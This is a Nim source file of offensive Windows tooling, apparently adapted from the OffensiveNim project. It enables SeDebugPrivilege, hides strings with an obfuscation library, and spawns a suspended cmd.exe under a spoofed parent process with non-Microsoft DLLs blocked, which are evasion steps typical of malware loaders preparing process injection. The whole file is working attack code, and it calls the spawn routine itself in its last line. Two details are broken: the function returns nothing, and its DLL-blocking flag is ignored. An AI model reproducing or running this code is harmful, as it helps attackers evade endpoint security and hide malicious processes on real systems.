import winim
import nimprotect


proc setDebugPrivilege*(): bool =
    # Inits
    var tp : TOKEN_PRIVILEGES
    var luid: LUID 
    var HTtoken: HANDLE
    var lpszPrivilege = protectString("SeDebugPrivilege")
    # Open current process token
    discard OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &HTtoken)
    # Get current privilege
    if LookupPrivilegeValue(NULL, lpszPrivilege, &luid) == 0:
        return false
    # Enable privilege
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    # Set privilege
    if AdjustTokenPrivileges(HTtoken, FALSE, &tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), NULL, NULL) == 0:
        return false
    # Success
    return true


proc toString*(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))


proc getPid*(pname: string): DWORD =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == pname:
                return entry.th32ProcessID

    return 0

# Heavily stolen from https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
proc createSuspendedExtendedProcess*(processCmd: cstring, parentProcessName: string, isBlockingDlls: bool): ptr PROCESS_INFORMATION =

    const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44

    var si: STARTUPINFOEX
    var pi: PROCESS_INFORMATION
    var ps: SECURITY_ATTRIBUTES
    var ts: SECURITY_ATTRIBUTES
    var policy: DWORD64
    var lpSize: SIZE_T
    var res: WINBOOL

    si.StartupInfo.cb = sizeof(si).cint
    ps.nLength = sizeof(ps).cint
    ts.nLength = sizeof(ts).cint

    InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)

    si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))

    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)

    policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON

    res = UpdateProcThreadAttribute(
        si.lpAttributeList,
        0,
        cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
        addr policy,
        sizeof(policy),
        NULL,
        NULL
    )

    var parentProcessId = getPid(parentProcessName)
    var parentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentProcessId)

    res = UpdateProcThreadAttribute(
        si.lpAttributeList,
        0,
        cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
        addr parentProcessHandle,
        sizeof(parentProcessHandle),
        NULL,
        NULL
    )

    res = CreateProcess(
        NULL,
        newWideCString(processCmd),
        ps,
        ts, 
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi
    )

discard createSuspendedExtendedProcess("c:\\windows\\system32\\cmd.exe", "nimsuggest.exe", true)